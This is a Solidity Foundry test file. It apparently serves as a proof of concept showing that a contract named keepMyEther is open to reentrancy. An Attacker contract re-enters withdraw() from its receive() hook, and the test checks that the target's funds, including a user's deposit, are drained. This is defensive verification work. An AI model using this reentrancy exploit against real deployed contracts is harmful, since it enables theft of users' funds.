// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7.sol";

contract KeepMyEtherTest is Test {
    keepMyEther public target;
    Attacker public attacker;
    address user = address(0x01);
    
    function setUp() public {
        // Deploy target contract
        target = new keepMyEther();
        
        // Fund user and deposit to target
        vm.deal(user, 1 ether);
        vm.prank(user);
        (bool sent, ) = address(target).call{value: 1 ether}("");
        require(sent, "User deposit failed");
        
        // Deploy attacker contract with funds
        attacker = new Attacker{value: 1 ether}(address(target));
        
        // Attacker deposits to target
        attacker.deposit();
    }
    
    function testReentrancyAttack() public {
        // Verify initial balances
        assertEq(address(target).balance, 2 ether, "Initial target balance");
        assertEq(address(attacker).balance, 0, "Initial attacker balance");

        // BEGIN DIFFERENTIAL CHECKS
        console2.log("--- BEFORE-Trigger state ---");
        uint256 targetEthBefore = address(target).balance;
        uint256 attackerEthBefore = address(attacker).balance;
        uint256 attackerDepositBefore;
        uint256 totalWithdrawalsBefore;

        // Safe queries for contract-specific states
        try target.balances(address(attacker)) returns (uint256 balance) {
            attackerDepositBefore = balance;
        } catch {
            attackerDepositBefore = 0;
        }
        try target.totalWithdrawals() returns (uint256 withdrawals) {
            totalWithdrawalsBefore = withdrawals;
        } catch {
            totalWithdrawalsBefore = 0;
        }

        console2.log("Target ETH balance (before):", targetEthBefore);
        console2.log("Attacker ETH balance (before):", attackerEthBefore);
        console2.log("Attacker deposit balance (before):", attackerDepositBefore);
        console2.log("Total withdrawals (before):", totalWithdrawalsBefore);

        console2.log("--- Triggering Attack ---");
        attacker.attack();

        console2.log("--- AFTER-Trigger state ---");
        uint256 targetEthAfter = address(target).balance;
        uint256 attackerEthAfter = address(attacker).balance;
        uint256 attackerDepositAfter;
        uint256 totalWithdrawalsAfter;

        // Safe queries for contract-specific states
        try target.balances(address(attacker)) returns (uint256 balance) {
            attackerDepositAfter = balance;
        } catch {
            attackerDepositAfter = 0;
        }
        try target.totalWithdrawals() returns (uint256 withdrawals) {
            totalWithdrawalsAfter = withdrawals;
        } catch {
            totalWithdrawalsAfter = 0;
        }

        console2.log("Target ETH balance (after):", targetEthAfter);
        console2.log("Attacker ETH balance (after):", attackerEthAfter);
        console2.log("Attacker deposit balance (after):", attackerDepositAfter);
        console2.log("Total withdrawals (after):", totalWithdrawalsAfter);

        // Compute changes
        console2.log("ETH drained from target:", targetEthBefore - targetEthAfter);
        console2.log("ETH gained by attacker:", attackerEthAfter - attackerEthBefore);

        // Final vulnerability verification via state changes
        if (targetEthAfter == 0 && attackerEthAfter == 2 ether) {
            console2.log("Vulnerability Exists: Reentrancy attack drained contract funds");
        } else {
            console2.log("Vulnerability not Exist: Attack failed to drain funds");
        }
        // END DIFFERENTIAL CHECKS

        // Original verification for test pass/fail
        assertEq(address(target).balance, 0, "Target should be drained");
        assertEq(address(attacker).balance, 2 ether, "Attacker should have stolen funds");
    }
}

contract Attacker {
    keepMyEther public target;
    uint private count;
    
    constructor(address _target) payable {
        target = keepMyEther(payable(_target));
    }
    
    function deposit() public {
        (bool sent, ) = address(target).call{value: 1 ether}("");
        require(sent, "Attacker deposit failed");
    }
    
    function attack() public {
        target.withdraw();
    }
    
    receive() external payable {
        if (count < 1 && address(target).balance >= 1 ether) {
            count++;
            target.withdraw();
        }
    }
}